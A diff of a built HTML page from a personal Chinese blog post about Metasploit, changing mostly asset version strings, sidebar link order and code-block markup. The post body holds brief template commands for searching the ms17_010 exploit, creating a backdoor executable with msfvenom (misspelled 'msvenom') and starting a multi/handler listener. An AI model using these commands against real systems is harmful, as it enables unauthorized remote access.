@@ -6,12 +6,12 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
 
 <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
-<meta name="description" content="msf使用metasploit 流程msfconsole  search [ms17_010] 查找漏洞  use [] 选择漏洞  show options 查看参数  session 查看会话 session [num] 选择会话   12run vnc  后门msvenom -p [payload] lhost&#x3D;[] lport&#x3D;[] -f(format) exe -o(output) fi">
+<meta name="description" content="msf使用metasploit 流程msfconsole  search [ms17_010] 查找漏洞  use [] 选择漏洞  show options 查看参数  session 查看会话 session [num] 选择会话   run vnc   后门msvenom -p [payload] lhost&#x3D;[] lport&#x3D;[] -f(format) exe -o(output) fil">
 <meta property="og:type" content="article">
 <meta property="og:title" content="msf使用">
 <meta property="og:url" content="http://blog.wray7.top/2023/09/04/Network/Safety/msf%E4%BD%BF%E7%94%A8/index.html">
 <meta property="og:site_name" content="Wray的Blog">
-<meta property="og:description" content="msf使用metasploit 流程msfconsole  search [ms17_010] 查找漏洞  use [] 选择漏洞  show options 查看参数  session 查看会话 session [num] 选择会话   12run vnc  后门msvenom -p [payload] lhost&#x3D;[] lport&#x3D;[] -f(format) exe -o(output) fi">
+<meta property="og:description" content="msf使用metasploit 流程msfconsole  search [ms17_010] 查找漏洞  use [] 选择漏洞  show options 查看参数  session 查看会话 session [num] 选择会话   run vnc   后门msvenom -p [payload] lhost&#x3D;[] lport&#x3D;[] -f(format) exe -o(output) fil">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://blog.wray7.top/home/wray/.config/Typora/typora-user-images/image-20221223144819404.png">
 <meta property="article:published_time" content="2023-09-04T13:48:57.000Z">
@@ -24,15 +24,15 @@
 <link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
 
 
-<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1712678568857">
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1712679368732">
 
-<link rel="stylesheet" href="/css/style.css?v=1712678568857">
+<link rel="stylesheet" href="/css/style.css?v=1712679368732">
 
 
 
 
     
-        <link rel="stylesheet" href="/custom.css?v=1712678568857">
+        <link rel="stylesheet" href="/custom.css?v=1712679368732">
     
 
 
@@ -42,7 +42,7 @@
 <script src="/lib/lax.min.js" async></script>
 
 
-<script async src="/js/app.js?v=1712678568857"></script>
+<script async src="/js/app.js?v=1712679368732"></script>
 
  
 
@@ -125,7 +125,7 @@
 </div>
 
 
-	<script async src="/js/search.js?v=1712678568857"></script>
+	<script async src="/js/search.js?v=1712679368733"></script>
 
 
 
@@ -222,19 +222,19 @@
           </li>
         
           <li>
-            <a href="/2023/09/05/Network/Server/devops/Docker/">Docker</a>
-          </li>
-        
-          <li>
             <a href="/2023/09/05/Network/Server/devops/Crontab/">Crontab</a>
           </li>
         
           <li>
-            <a href="/2023/09/04/Code/Shell%E8%AF%AD%E6%B3%95/">Shell语法</a>
+            <a href="/2023/09/05/Network/Server/devops/Docker/">Docker</a>
           </li>
         
           <li>
             <a href="/2023/09/04/Code/Git%E6%95%99%E7%A8%8B/">Git教程</a>
+          </li>
+        
+          <li>
+            <a href="/2023/09/04/Code/Shell%E8%AF%AD%E6%B3%95/">Shell语法</a>
           </li>
         
       </ul>
@@ -285,7 +285,8 @@
 <p><code>session [num]</code> 选择会话</p>
 </li>
 </ol>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run vnc</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run vnc
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><p><code>msvenom -p [payload] lhost=[] lport=[] -f(format) exe -o(output) file_name.exe</code></p>
 <h2 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h2><p><code>use exploit/multi/handler</code></p>
@@ -320,7 +321,7 @@
 </div>
   
   
-    <script async src="/js/copy-codeblock.js?v=1712678568715"></script>
+    <script async src="/js/copy-codeblock.js?v=1712679368580"></script>
   
 
   
